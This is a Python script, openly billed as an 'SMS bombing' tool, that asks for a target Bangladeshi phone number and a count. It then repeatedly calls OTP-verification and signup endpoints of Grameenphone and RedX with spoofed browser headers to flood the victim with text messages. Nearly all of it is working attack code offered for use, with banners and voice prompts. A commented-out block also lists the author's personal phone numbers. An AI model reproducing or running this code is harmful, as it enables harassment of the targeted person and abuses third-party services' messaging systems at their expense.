import os,sys,time,json,random,re,string,platform,base64,uuid
#-----------color-----------------#
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White

# Background
on_black="\033[40m"       # Black
on_red="\033[41m"         # Red
on_green="\033[42m"       # Green
on_yellow="\033[43m"      # Yellow
on_blue="\033[44m"        # Blue
on_purple="\033[45m"      # Purple
on_cyan="\033[46m"        # Cyan
on_white="\033[47m"       # White
#-------clear def-------#
def clear():
	os.system("clear")
from os import system as _SUYAIB_
print("\033[1;92m{}>..𝐂𝐇𝐄𝐀𝐊𝐈𝐍𝐆 𝐔𝐏𝐃𝐀𝐓𝐄...")
os.system('espeak -a 300 "cheaking.  update.    "')
#os.system("pkg install espeak")
print("\033[1;92m{}>..𝐈𝐀𝐌 𝐒𝐌𝐒 𝐁𝐎𝐎𝐌𝐁𝐈𝐍𝐆 𝐓𝐎𝐎𝐋𝐒...")
os.system('espeak -a 300 " iam.      sms.      boombing       tools    "')
print("\033[1;92m{}>..𝐈 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐌𝐃 𝐒𝐔𝐘𝐀𝐈𝐁 𝐈𝐒𝐋𝐀𝐌...")
os.system('espeak -a 300 " i.     made.    by.    md.     shuaib.   islam.    "')

#os.system("git pull")
#os.system("pip install bs4")
#os.system("pip install requests")
#os.system("pip install mechanize")

print("\033[1;92m{}>..𝐂𝐘𝐁𝐄𝐑 𝐊𝐈𝐍𝐆 𝐒𝐔𝐘𝐀𝐈𝐁 (𝐑𝐎𝐁𝐎𝐓) 𝐒𝐘𝐒𝐓𝐄𝐌 𝐈𝐍𝐒𝐓𝐀𝐋𝐈𝐍𝐆....\033[1;30m")
os.system('espeak -a 300 "Cyber.   King.   shuaib.   Robot.   system.   installing "')
#os.system("git pull")
print("\033[1;92m{}>..𝐑𝐎𝐁𝐎𝐓 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄..{√}\033[1;30m")
os.system('espeak -a 300 "Robot.   install.   complete"')
print("\033[1;92m{}>..𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐋𝐎𝐀𝐃𝐈𝐍𝐆.....\033[1;30m")
os.system('espeak -a 300 "Please.   WAIT.   FOR.   LOADING...."')
#os.system("pip install bs4")
import os,requests,time
time.sleep(1)
os.system("clear")

logo3=("""
\033[47m\033[0;30m➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤
  \033[1;32m
             ██╗ ██████╗ ████████╗██╗  ██╗██╗
             ██║██╔═══██╗╚══██╔══╝██║  ██║██║
             ██║██║   ██║   ██║   ███████║██║
        ██   ██║██║   ██║   ██║   ██╔══██║██║
        ╚█████╔╝╚██████╔╝   ██║   ██║  ██║██║
         ╚════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝ 
\033[47m\033[0;30m➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤
\033[1;32m                        ╔═════╗
                        ║ 𝐕𝐈𝐏 ║
                        ╚═════╝
██████╗  ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                 
\033[47m\033[0;30m➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤
""")
"""
print("\033[34;1m iam sms boomb ")
os.system('espeak -a 300 "author...........shuaib"')
print("\033[37;1mFacebook...Id...Suyaib...Islam ")
os.system('espeak -a 300 "Facebook..............id............shuaib.........islam"')
print("\x1b[38;5;196mWhats...App...number...01731434880 ")
os.system('espeak -a 300 "whatsapp............number................0.........…1......…......7.............3.............1................4.............3.............4................8..................8................0....."')
print("\033[34;1mTelegram...Number...01301305076 ")
os.system('espeak -a 300 "telegram............ number.............0.............1................3.................0.................1...................3..................0...................5.....................0....................7................6..... "')
print("\033[37;1mImo...Number...01731434880 ")
os.system('espeak -a 300 "emo..............number......................0.........…1......…......7.............3.............1................4.............3.............4................8..................8................0....."')
print("\x1b[38;5;196mFrom..Bangladesh ")
os.system('espeak -a 300 "from................Bangladesh......"')"""
os.system('clear')
print(logo3)
num=input("""\033[1;30m{.....}TARGET NUMBER : +880""")
amount=int(input("\n\033[1;30m{.....}SMS AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.grameenphone.com/myoffers/verify-number/06b1338ba02add2b5d2da67663b19ebe?anon_token=zF0w9-6wpc9cwR11sZBZVUbWTj1PPopyEF_2tW5csiU+&myoffer_msisdn=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://www.grameenphone.com/myoffers/verify-number/06b1338ba02add2b5d2da67663b19ebe?anon_token=zF0w9-6wpc9cwR11sZBZVUbWTj1PPopyEF_2tW5csiU+&myoffer_msisdn=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses}  \033[38;5;46m🦋⃟𝐒𝐌𝐒✮⃝ 𝐒𝐄𝐍𝐃𝄟⃝  𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋✔️🤫")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝐒𝐌𝐒✮⃝ 𝐒𝐄𝐍𝐃𝄟⃝  𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋✔️🤫")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝐒𝐌𝐒✮⃝ 𝐒𝐄𝐍𝐃𝄟⃝  𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋✔️🤫")
    
  else:
    pass
os.system("clear")
print("""
\033[47m\033[0;30m➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤
 \033[1;36m   
 
███████╗██╗███╗   ██╗██╗███████╗██╗  ██╗
██╔════╝██║████╗  ██║██║██╔════╝██║  ██║
█████╗  ██║██╔██╗ ██║██║███████╗███████║
██╔══╝  ██║██║╚██╗██║██║╚════██║██╔══██║
██║     ██║██║ ╚████║██║███████║██║  ██║
╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝
                                        

                                                    
\033[47m\033[0;30m➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤
""")
